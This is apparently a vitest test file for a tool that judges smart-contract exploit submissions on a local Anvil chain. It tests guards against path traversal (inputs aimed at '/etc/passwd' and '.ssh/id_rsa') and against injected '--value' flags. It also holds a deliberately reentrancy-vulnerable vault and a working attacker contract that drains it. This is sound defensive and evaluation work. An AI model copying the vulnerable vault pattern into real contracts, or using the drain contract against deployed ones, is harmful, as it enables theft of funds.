import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { mkdtemp, mkdir, writeFile, rm, symlink } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import {
  detectFoundry, startAnvil, forgeBuildArtifact, castDeploy, castSend,
  ANVIL_ACCOUNTS, runBroadcastExploit, safeProjectPath, type AnvilHandle,
} from '../src/index.js';

// ---- safeProjectPath: the traversal guard (runs without Foundry) ----------
describe('safeProjectPath — refuses PR-author paths that escape the project', () => {
  const base = '/work/project';
  it('accepts an ordinary nested source path', () => {
    expect(safeProjectPath(base, 'src/Vault.sol')).toBe('/work/project/src/Vault.sol');
  });
  it('rejects parent-dir traversal', () => {
    expect(() => safeProjectPath(base, '../../etc/passwd')).toThrow(/escape|unsafe/i);
  });
  it('rejects an absolute path', () => {
    expect(() => safeProjectPath(base, '/etc/passwd')).toThrow(/absolute|unsafe/i);
  });
  it('rejects a sneaky traversal that normalises outside', () => {
    expect(() => safeProjectPath(base, 'src/../../../root/.ssh/id_rsa')).toThrow(/escape|unsafe/i);
  });
  it('rejects empty and NUL-bearing paths', () => {
    expect(() => safeProjectPath(base, '')).toThrow(/unsafe/i);
    expect(() => safeProjectPath(base, 'src/\0.sol')).toThrow(/NUL|unsafe/i);
  });
  it('allows a legitimate filename that merely starts with dots', () => {
    // `..keep` is a real filename, not traversal — it must not be over-rejected.
    expect(safeProjectPath(base, '..keep')).toBe('/work/project/..keep');
  });
  it('rejects a symlink that resolves outside the project (realpath check)', async () => {
    const realBase = await mkdtemp(join(tmpdir(), 'redline-guard-'));
    // `escape` -> the system temp root, which is outside realBase.
    await symlink(tmpdir(), join(realBase, 'escape'));
    expect(() => safeProjectPath(realBase, 'escape/secret.sol')).toThrow(/symlink|unsafe|escape/i);
    await rm(realBase, { recursive: true, force: true });
  });
});

// ---- cast argument-injection guard (runs without Foundry: asserts fire first) ----
describe('cast helpers refuse flag-shaped signatures and args (no injection)', () => {
  const common = { rpcUrl: 'http://127.0.0.1:1', privateKey: ANVIL_ACCOUNTS[0]!.privateKey, to: '0x0000000000000000000000000000000000000000' };
  it('rejects a call arg that looks like a cast flag', async () => {
    await expect(castSend({ ...common, sig: 'attack()', args: ['--value'] })).rejects.toThrow(/unsafe|flag/i);
  });
  it('rejects a self-funding --value injected as an arg', async () => {
    await expect(castSend({ ...common, sig: 'attack()', args: ['--value', '5ether'] })).rejects.toThrow(/unsafe|flag/i);
  });
  it('rejects a flag-shaped signature', async () => {
    await expect(castSend({ ...common, sig: '--unlocked' })).rejects.toThrow(/unsafe/i);
  });
  it('accepts an ordinary signature + address arg (guard does not over-reject)', async () => {
    // A valid sig passes the guard and reaches the unreachable node; castSend catches
    // the connection failure and resolves to status:false — proving it was NOT rejected
    // by the guard (which would throw /unsafe/ before any network call).
    await expect(
      castSend({ ...common, sig: 'attack(address)', args: ['0x0000000000000000000000000000000000000001'] }),
    ).resolves.toMatchObject({ status: false });
  });
});

// ---- execution-level isolation: real transactions make cheats inert --------
const VAULT = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract EtherVault {
  mapping(address => uint256) public balances;
  function deposit() external payable { balances[msg.sender] += msg.value; }
  function withdraw() external {
    uint256 bal = balances[msg.sender];
    require(bal > 0, "no balance");
    (bool ok, ) = msg.sender.call{value: bal}("");
    require(ok, "send failed");
    balances[msg.sender] = 0; // state update AFTER the external call -> reentrant
  }
}`;

// A genuine reentrancy attacker: no cheats, just real calls. Drains the vault.
const REENTRANCY = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
interface IVault { function deposit() external payable; function withdraw() external; }
contract ReentrancyAttacker {
  IVault public vault;
  uint256 stake;
  constructor(address v) { vault = IVault(v); }
  function attack() external payable {
    stake = msg.value;
    vault.deposit{value: msg.value}();
    vault.withdraw();
  }
  receive() external payable {
    if (address(vault).balance >= stake) { vault.withdraw(); }
  }
}`;

// A fake attacker that tries to mint itself funds via the cheatcode precompile.
// Under forge test this "works"; as a real transaction it is an inert no-op.
const CHEAT = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
interface IVm { function deal(address, uint256) external; }
contract CheatAttacker {
  IVm constant vm = IVm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
  constructor(address) {}
  function attack() external payable {
    vm.deal(address(this), 1000 ether); // inert on a real node
  }
  receive() external payable {}
}`;

// Detect at module scope: it.skipIf() is evaluated at collection time, before
// beforeAll runs, so the flag it reads must already be resolved here.
const hasFoundry = (await detectFoundry()).available;
let project: string;
let node: AnvilHandle | null = null;

beforeAll(async () => {
  if (!hasFoundry) return;
  project = await mkdtemp(join(tmpdir(), 'redline-bcast-'));
  await mkdir(join(project, 'src'), { recursive: true });
  await writeFile(join(project, 'foundry.toml'), '[profile.default]\nsrc = "src"\nout = "out"\n');
  await writeFile(join(project, 'src', 'EtherVault.sol'), VAULT);
  await writeFile(join(project, 'src', 'ReentrancyAttacker.sol'), REENTRANCY);
  await writeFile(join(project, 'src', 'CheatAttacker.sol'), CHEAT);
  node = await startAnvil();
}, 120_000);

afterAll(async () => {
  if (node) await node.stop();
  if (hasFoundry && project) await rm(project, { recursive: true, force: true });
});

describe('broadcast referee — attacks run as real transactions, cheats are inert', () => {
  it.skipIf(!hasFoundry)('a genuine reentrancy attack drains the vault (measured from real balances)', async () => {
    const rpcUrl = node!.rpcUrl;
    // Deploy the vulnerable vault.
    const { bytecode: vaultCode } = await forgeBuildArtifact({ projectDir: project, contractName: 'EtherVault' });
    const vault = await castDeploy({ rpcUrl, privateKey: ANVIL_ACCOUNTS[0]!.privateKey, bytecode: vaultCode });
    // An honest depositor puts 10 ETH in — real value the attacker must actually steal.
    const tenEth = (10n * 10n ** 18n).toString();
    const dep = await castSend({ rpcUrl, privateKey: ANVIL_ACCOUNTS[1]!.privateKey, to: vault, sig: 'deposit()', valueWei: tenEth });
    expect(dep.status).toBe(true);

    const { bytecode: attackerCode } = await forgeBuildArtifact({ projectDir: project, contractName: 'ReentrancyAttacker' });
    const run = await runBroadcastExploit({
      rpcUrl,
      targetAddress: vault,
      attackerBytecode: attackerCode,
      constructorSig: 'constructor(address)',
      constructorArgs: [vault],
      stakeWei: (1n * 10n ** 18n).toString(), // attacker's own 1 ETH
      thresholdWei: (1n * 10n ** 18n).toString(), // must move >= 1 ETH to count
      refereeName: 'referee-a', provider: 'anvil-fresh', candidateId: 'c-reentrancy',
    });

    expect(run.outcome).toBe('moved');
    // Stole the honest depositor's 10 ETH (net of its own returned stake), and the
    // vault's measured balance dropped by the same amount: the delta adds up.
    const d = run.deltas[0]!;
    expect(BigInt(d.attackerNetOfGas)).toBeGreaterThanOrEqual(9n * 10n ** 18n);
    expect(BigInt(d.targetBefore) - BigInt(d.targetAfter)).toBeGreaterThanOrEqual(10n * 10n ** 18n);
    expect(BigInt(d.attackerAfter) - BigInt(d.attackerBefore)).toBe(BigInt(d.attackerNetOfGas));
  }, 120_000);

  it.skipIf(!hasFoundry)('a cheatcode-based fake attack nets zero — the precompile is inert', async () => {
    const rpcUrl = node!.rpcUrl;
    const { bytecode: cheatCode } = await forgeBuildArtifact({ projectDir: project, contractName: 'CheatAttacker' });
    const run = await runBroadcastExploit({
      rpcUrl,
      targetAddress: '0x0000000000000000000000000000000000000001',
      attackerBytecode: cheatCode,
      constructorSig: 'constructor(address)',
      constructorArgs: ['0x0000000000000000000000000000000000000000'],
      stakeWei: '0',
      thresholdWei: (1n * 10n ** 15n).toString(), // 0.001 ETH — tiny bar it still can't clear
      refereeName: 'referee-a', provider: 'anvil-fresh', candidateId: 'c-cheat',
    });

    // vm.deal did nothing: the contract minted itself no balance, so no money moved.
    expect(run.outcome).toBe('did-not-move');
    expect(run.deltas[0]!.attackerNetOfGas).toBe('0');
  }, 120_000);

  it.skipIf(!hasFoundry)('an injected --value arg cannot manufacture a moved verdict', async () => {
    const rpcUrl = node!.rpcUrl;
    const { bytecode: cheatCode } = await forgeBuildArtifact({ projectDir: project, contractName: 'CheatAttacker' });
    // A malicious candidate tries to smuggle `--value 5ether` through the entrypoint
    // args so the attacker self-funds from its 10,000-ETH EOA and registers as theft.
    const run = await runBroadcastExploit({
      rpcUrl,
      targetAddress: '0x0000000000000000000000000000000000000001',
      attackerBytecode: cheatCode,
      constructorSig: 'constructor(address)',
      constructorArgs: ['0x0000000000000000000000000000000000000000'],
      entrypoint: 'attack()',
      entrypointArgs: ['--value', '5000000000000000000'],
      stakeWei: '0',
      thresholdWei: (1n * 10n ** 15n).toString(),
      refereeName: 'referee-a', provider: 'anvil-fresh', candidateId: 'c-inject',
    });
    // The guard rejects the flag-shaped arg before any tx; never 'moved'.
    expect(run.outcome).toBe('error');
    expect(run.outcome).not.toBe('moved');
  }, 120_000);
});
